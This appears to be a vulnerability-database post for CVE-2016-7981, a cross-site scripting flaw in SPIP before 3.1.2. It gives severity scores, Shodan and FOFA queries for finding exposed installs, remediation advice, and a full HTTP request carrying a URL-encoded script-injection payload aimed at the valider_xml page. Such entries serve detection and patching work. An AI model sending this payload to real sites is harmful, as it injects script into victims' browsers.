---
layout: "post"
cve_id: "CVE-2016-7981"
title: "SPIP <3.1.2 - Cross-Site Scripting"
pcap: true
pcap_path: "/pcaps/2016/CVE-2016-7981.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2016/CVE-2016-7981.yaml"
author: "pikpikcu"
severity: "medium"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the victim's browser.
"
remediation: "Upgrade SPIP to version 3.1.2 or later to mitigate this vulnerability.
"
reference:
  - "https://core.spip.net/projects/spip/repository/revisions/23202"
  - "https://core.spip.net/projects/spip/repository/revisions/23201"
  - "https://core.spip.net/projects/spip/repository/revisions/23200"
  - "https://nvd.nist.gov/vuln/detail/CVE-2016-7981"
  - "http://www.openwall.com/lists/oss-security/2016/10/05/17"
classification: "{'cvss-metrics': 'CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N', 'cvss-score': 6.1, 'cve-id': 'CVE-2016-7981', 'cwe-id': 'CWE-79', 'epss-score': 0.37001, 'epss-percentile': 0.97017, 'cpe': 'cpe:2.3:a:spip:spip:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'spip', 'product': 'spip', 'shodan-query': ['http.html:"spip.php?page=backend"', 'cpe:"cpe:2.3:a:spip:spip"'], 'fofa-query': 'body="spip.php?page=backend"'}"
tags:
  - "cve2016"
  - "cve"
  - "xss"
  - "spip"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
SPIP 3.1.2 and earlier contains a cross-site scripting vulnerability in valider_xml.php which allows remote attackers to inject arbitrary web script or HTML via the var_url parameter in a valider_xml action.


## ðŸŒ HTTP Request
```nohighlight
GET /ecrire/?exec=valider_xml&var_url=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

